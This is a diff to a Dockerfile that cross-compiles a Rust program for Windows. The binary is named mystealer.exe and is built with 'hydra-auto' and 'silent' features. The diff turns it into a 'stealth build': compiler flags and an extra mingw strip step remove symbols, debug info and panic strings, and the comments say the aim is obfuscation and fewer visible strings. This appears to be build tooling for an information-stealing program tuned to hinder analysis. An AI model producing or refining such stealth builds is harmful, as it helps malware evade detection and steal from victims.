@@ -1,4 +1,4 @@
-# Cross-compile para Windows
+# Cross-compile para Windows - STEALTH BUILD
 FROM rust:latest
 
 WORKDIR /app
@@ -18,7 +18,24 @@ RUN mkdir -p /.cargo && \
 
 COPY . .
 
-# Build pra Windows com Hydra automático e modo silencioso (sem strings de log)
+# ============================================================================
+# STEALTH BUILD FLAGS
+# ============================================================================
+# -C panic=abort - Remove unwind tables e panic strings
+# -C debuginfo=0 - Remove debug info
+# -C opt-level=z - Otimização para tamanho (ajuda a remover strings)
+# -C lto=fat - Link-Time Optimization agressivo
+# -C codegen-units=1 - Melhor otimização
+# -C strip=symbols - Remove símbolos
+# -C link-arg=-s - Strip ao linkar
+# ============================================================================
+
+ENV RUSTFLAGS="-C panic=abort -C debuginfo=0 -C opt-level=z -C lto=fat -C codegen-units=1 -C strip=symbols -C link-arg=-s"
+
+# Build pra Windows com todas as features de ofuscação
 RUN cargo build --release --target x86_64-pc-windows-gnu --features "hydra-auto,silent"
+
+# Strip adicional com mingw-strip
+RUN x86_64-w64-mingw32-strip --strip-all /app/target/x86_64-pc-windows-gnu/release/mystealer.exe 2>/dev/null || true
 
 CMD ["cp", "-r", "/app/target/x86_64-pc-windows-gnu/release/", "/output/"]
